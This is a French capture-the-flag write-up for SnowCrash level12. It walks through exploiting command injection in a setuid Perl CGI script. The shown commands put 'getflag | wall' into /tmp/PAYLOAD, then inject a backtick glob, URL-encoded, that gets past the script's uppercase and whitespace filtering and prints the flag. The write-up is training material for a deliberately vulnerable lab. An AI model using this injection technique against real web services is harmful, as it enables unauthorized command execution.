Avec la commande **ls**, on trouve le fichier **level12.pl**.

```bash
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

Le script Perl ci-dessous est un script CGI qui prend deux paramètres en entrée via une requête HTTP et affiche `.` ou `..` selon le résultat.

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

On peut communiquer avec le script à l'aide de **curl**.

```bash
level12@SnowCrash:~$ curl "http://localhost:4646?x=hello"
..
```

Seul le paramètre **x** nous sera utile, dans la fonction **t** il est stocké dans la variable **xx** et 2 opérations sont effectuées sur lui.
- `tr/a-z/A-Z/` : Convertit toutes les lettres en majuscules.
- `s/\s.*//` : Supprime tout ce qui suit le premier whitespace.

(`hello world` devient `HELLO`)

Le script exécute une commande **egrep** à l'aide des backtick, sans vérifier le contenu de **xx**, on peut donc exécuter ce que l'on veut.

Cependant, il faut prendre en compte que tout doit être en majuscule et qu'il n'y a pas de whitespace.

La commande `getflag` deviendra `GETFLAG`, et ceci n'est pas une commande reconnue.

La solution est de mettre la commande dans un fichier et d'exécuter ce fichier.

```bash
level12@SnowCrash:~$ echo "getflag | wall" > /tmp/PAYLOAD
level12@SnowCrash:~$ chmod +x /tmp/PAYLOAD
```

Notre payload sera donc `` `/*/PAYLOAD` ``.

Il reste juste à l'encoder sous format URL à l'aide du site [urlencoder](https://www.urlencoder.org/fr/).

```bash
level12@SnowCrash:~$ curl "http://localhost:4646?x=%60%2F%2A%2FPAYLOAD%60"

Broadcast Message from flag12@Snow
        (somewhere) at XX:XX ...

Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```